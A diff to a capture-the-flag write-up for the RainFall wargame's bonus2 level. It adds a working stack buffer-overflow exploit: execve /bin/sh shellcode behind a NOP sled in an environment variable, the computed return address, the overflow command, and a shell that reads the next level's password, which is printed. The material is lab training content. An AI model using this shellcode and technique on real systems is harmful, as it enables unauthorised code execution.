@@ -39,13 +39,13 @@ Again, we use We are again using https://wiremask.eu/tools/buffer-overflow-patte
 0x41366141 in ?? ()
 -> offset is 18
 
-Now, we cannot jump anywhere (like in an env var), but we can ret to libc.
+Ok, let's do it just like in bonus0 (execute shellcode from env var)
+-> Notice the big nopsled: the exploit would not work otherwise
 
--> TODO: ret to libc
-
-
-
-
-
-
-~$ LANG=fi ./bonus2 $(python -c "print 'A'*40 + ' ' + 'B'*18 + '\x5a\xff\xff\xbf'")
+bonus2@RainFall:~$ export LANG=fi
+bonus2@RainFall:~$ export SCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+bonus2@RainFall:~$ /tmp/getenv SCODE
+SCODE @ 0xbffff8e9 -> \x9d\xf8\xff\xbf
+./bonus2 $(python -c "print 'A'*40 + ' ' + 'B'*18 + '\x9d\xf8\xff\xbf'")
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
